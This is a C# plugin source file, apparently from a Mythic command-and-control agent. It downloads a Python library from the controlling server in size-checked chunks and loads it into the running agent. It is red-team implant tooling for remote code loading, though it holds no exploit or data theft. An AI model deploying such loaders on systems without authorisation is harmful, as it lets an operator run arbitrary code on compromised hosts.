using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "python-load";
        private IMessageManager messageManager { get; set; }
        private IPythonManager pythonManager { get; set; }
        private IAgentConfig agentConfig { get; set; }
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        private ConcurrentDictionary<string, List<byte>> _streams { get; set; }
        private readonly ConcurrentDictionary<string, CancellationTokenRegistration> cancellationRegistrations = new();
        private const long MaximumTransferBytes = 256L * 1024 * 1024;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.pythonManager = pythonManager;
            this.agentConfig = config;
            this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
            this._streams = new ConcurrentDictionary<string, List<byte>>();
        }

        public async Task Execute(ServerJob job)
        {
            PythonLoadArgs pyArgs = JsonSerializer.Deserialize<PythonLoadArgs>(job.task.parameters);

            if (pyArgs is null)
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }


            //Start Download
            ServerUploadJob uploadJob = new ServerUploadJob(job, agentConfig.chunk_size);
            if (job.cancellationtokensource is not null)
            {
                uploadJob.cancellationtokensource = job.cancellationtokensource;
            }
            uploadJob.file_id = pyArgs.file;
            uploadJob.chunk_num = 1;
            //Add job to our tracker
            if (!uploadJobs.TryAdd(job.task.id, uploadJob))
            {
                messageManager.AddTaskResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "failed to add job to tracker",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            if (!_streams.TryAdd(job.task.id, new List<byte>()))
            {
                uploadJobs.TryRemove(job.task.id, out _);
                messageManager.WriteLine("failed to add transfer buffer", job.task.id, true, "error");
                return;
            }

            RegisterCancellation(job);
            if (!uploadJobs.ContainsKey(job.task.id))
            {
                return;
            }

            //Officially kick off file upload with Mythic
            messageManager.AddTaskResponse(new UploadTaskResponse
            {
                task_id = job.task.id,
                upload = new UploadTaskResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = string.Empty,
                },
                user_output = string.Empty
            }.ToJson());
        }

        public Task HandleNextMessage(ServerTaskingResponse response)
        {
            if (!uploadJobs.TryGetValue(response.task_id, out ServerUploadJob? uploadJob))
            {
                ReportError(response.task_id, "Failed to get job");
                return Task.CompletedTask;
            }

            byte[] chunk;
            try { chunk = Base64Transfer.Decode(response.chunk_data, uploadJob.chunk_size); }
            catch (FormatException)
            {
                ReportAndAbort(response.task_id, "Invalid chunk data received.");
                return Task.CompletedTask;
            }
            catch (ArgumentException exception)
            {
                ReportAndAbort(response.task_id, exception.Message);
                return Task.CompletedTask;
            }

            byte[]? completedBytes = null;
            string? error = null;
            UploadTaskResponse? next = null;
            lock (uploadJob)
            {
                if (!uploadJobs.TryGetValue(response.task_id, out ServerUploadJob? current) || !ReferenceEquals(current, uploadJob))
                    return Task.CompletedTask;
                if (uploadJob.cancellationtokensource.IsCancellationRequested) error = "Cancellation Requested";
                else if (response.total_chunks <= 0 || (uploadJob.total_chunks != 0 && response.total_chunks != uploadJob.total_chunks)) error = "Invalid total chunk count.";
                else if (response.chunk_num != uploadJob.chunk_num) error = $"Expected chunk {uploadJob.chunk_num}, received {response.chunk_num}.";
                else if (chunk.Length == 0) error = "No chunk data received.";
                else if (chunk.Length > uploadJob.chunk_size || (long)response.total_chunks * uploadJob.chunk_size > MaximumTransferBytes) error = "Transfer exceeds the configured size limit.";
                else if (!_streams.TryGetValue(response.task_id, out List<byte>? stream)) error = "Failed to get transfer buffer.";
                else
                {
                    uploadJob.total_chunks = response.total_chunks;
                    lock (stream)
                    {
                        if ((long)stream.Count + chunk.Length > MaximumTransferBytes) error = "Transfer exceeds the configured size limit.";
                        else stream.AddRange(chunk);
                    }
                    if (error is null)
                    {
                        if (response.chunk_num == uploadJob.total_chunks)
                        {
                            if (uploadJobs.TryRemove(response.task_id, out _) && _streams.TryRemove(response.task_id, out stream))
                                lock (stream) completedBytes = stream.ToArray();
                        }
                        else
                        {
                            uploadJob.chunk_num++;
                            next = new UploadTaskResponse { task_id = response.task_id, status = $"Processed {response.chunk_num}/{uploadJob.total_chunks}", upload = new UploadTaskResponseData { chunk_num = uploadJob.chunk_num, file_id = uploadJob.file_id, chunk_size = uploadJob.chunk_size, full_path = uploadJob.path } };
                        }
                    }
                }
            }

            if (error is not null) { ReportAndAbort(response.task_id, error); return Task.CompletedTask; }
            if (completedBytes is not null)
            {
                UnregisterCancellation(response.task_id);
                bool loaded = pythonManager.LoadPyLib(completedBytes);
                messageManager.AddTaskResponse(new TaskResponse { task_id = response.task_id, user_output = loaded ? "Loaded." : "Failed to load lib.", completed = true, status = loaded ? string.Empty : "error" });
                messageManager.CompleteJob(response.task_id);
            }
            else if (next is not null) messageManager.AddTaskResponse(next.ToJson());
            return Task.CompletedTask;
        }


        private void AbortUploadJob(string task_id)
        {
            if (!uploadJobs.TryGetValue(task_id, out ServerUploadJob? job)) return;
            lock (job)
            {
                if (!uploadJobs.TryGetValue(task_id, out ServerUploadJob? current) || !ReferenceEquals(current, job)) return;
                if (!uploadJobs.TryRemove(task_id, out _)) return;
                _streams.TryRemove(task_id, out _);
            }
            UnregisterCancellation(task_id);
            messageManager.CompleteJob(task_id);
        }

        private void ReportError(string taskId, string error) =>
            messageManager.AddTaskResponse(new TaskResponse { status = "error", completed = true, task_id = taskId, user_output = error }.ToJson());

        private void ReportAndAbort(string taskId, string error)
        {
            ReportError(taskId, error);
            AbortUploadJob(taskId);
        }

        private void RegisterCancellation(ServerJob job)
        {
            if (job.cancellationtokensource is null) return;

            CancellationTokenRegistration registration = job.cancellationtokensource.Token.Register(
                static state =>
                {
                    var (plugin, taskId) = ((Plugin, string))state!;
                    plugin.AbortUploadJob(taskId);
                },
                (this, job.task.id));
            cancellationRegistrations[job.task.id] = registration;

            if (!uploadJobs.ContainsKey(job.task.id))
            {
                UnregisterCancellation(job.task.id);
            }
        }

        private void UnregisterCancellation(string taskId)
        {
            if (cancellationRegistrations.TryRemove(taskId, out CancellationTokenRegistration registration))
            {
                registration.Unregister();
            }
        }

    }
}
